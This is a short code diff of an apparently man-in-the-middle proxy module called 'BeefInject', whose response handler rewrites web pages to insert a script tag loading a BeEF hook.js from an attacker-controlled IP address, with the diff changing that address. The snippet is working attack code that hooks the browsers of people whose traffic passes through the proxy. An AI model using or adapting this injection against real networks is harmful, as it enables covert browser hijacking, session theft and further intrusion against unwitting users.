@@ -10,8 +10,8 @@ function onResponse(req, res) {
  log( "BeefInject loaded." );
       res.Body = body.replace( 
         '</head>', 
-        '<script type="text/javascript" src="http://192.168.155.109:3000/hook.js"></script></head>' 
-      ); 
+        '<script type="text/javascript" src="http://192.168.1.1:3000/hook.js"></script></head>' 
+      ); //dont forget localhost ip for here ^
     }
   }
 }
